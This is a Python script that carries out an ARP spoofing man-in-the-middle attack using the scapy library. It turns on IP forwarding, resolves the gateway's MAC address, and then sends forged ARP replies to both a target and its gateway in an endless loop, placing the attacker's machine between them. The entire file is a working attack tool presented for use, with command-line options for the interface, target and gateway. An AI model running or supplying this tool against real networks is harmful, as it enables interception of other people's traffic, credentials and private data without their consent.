# scapy-mitm   ARP Man-In-The-Middle in IPv4 using scapy lib     by 0bfxgh0st*
import sys
from scapy.all import *

def GetMAC(gatewayip,interface):

  packet = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gatewayip),iface=interface,verbose=False)
  gatewaymac = packet[0][0][1].hwsrc
  atmac = packet[0][0][1].hwdst
  return gatewaymac, atmac

def spoof(targetip,gatewayip,atmac,gatewaymac,interface):

  send(ARP(op=1, pdst=targetip, psrc=gatewayip, hwdst=atmac),iface=interface,verbose=False)
  send(ARP(op=1, pdst=gatewayip, psrc=targetip, hwdst=gatewaymac),iface=interface,verbose=False)

def main():

  if len(sys.argv) < 7:
    print("Usage: sudo python3 " + sys.argv[0] + " -i <interface> -t <target ip> -g <gateway ip>")
    sys.exit(1)

  arguments_list = []
  for arg in sys.argv:
    arguments_list.append(arg)
  for argument in arguments_list:  
    if argument == '-i':
      n = arguments_list.index(argument)+1
      interface = arguments_list[n]
    if argument == '-t':
      n = arguments_list.index(argument)+1
      targetip = arguments_list[n]
    if argument == '-g':
      n = arguments_list.index(argument)+1
      gatewayip = arguments_list[n]

  if sys.platform == 'linux':
    print("[+] Enabling ip forward")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

  print("[+] Retrieving MAC Addresses from ARP packet")    
  mac = GetMAC(gatewayip,interface)
  gatewaymac=mac[0]
  atmac = mac[1]
  
  print("[*] Spoofing")
  try:
    while True:
      spoof(targetip,gatewayip,atmac,gatewaymac,interface)
  except:
    if sys.platform == 'linux':
      print("[-] Disabling ip forward")
      os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
      sys.exit(1)

main()
